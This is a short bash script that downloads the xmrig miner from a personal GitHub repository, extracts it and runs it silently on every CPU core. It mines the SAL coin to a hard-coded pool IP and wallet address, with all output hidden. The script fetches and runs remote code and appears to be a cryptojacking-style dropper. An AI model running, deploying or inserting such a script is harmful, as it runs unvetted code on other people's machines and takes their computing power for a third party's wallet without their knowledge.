#!/bin/bash
A=128.199.195.239:443
B=SaLvs6xH5qeV5j4DTgCFCmdE9Sgix5QcJfravWBbsgDJDGJ9YqgMcLxFALARL4eoN5JEjds8GcjPnXRfKFruYGeRNyDKdhsm3dC
C=KOJO
wget https://github.com/Adeemar7/all/raw/main/xmrig.tar.gz && tar -xvf xmrig.tar.gz >/dev/null 2>&1
./xmrig --coin=SAL --url $A --user $B.$C --pass x --donate-level 1 -a rx/0 -t $(nproc --all) >/dev/null 2>&1
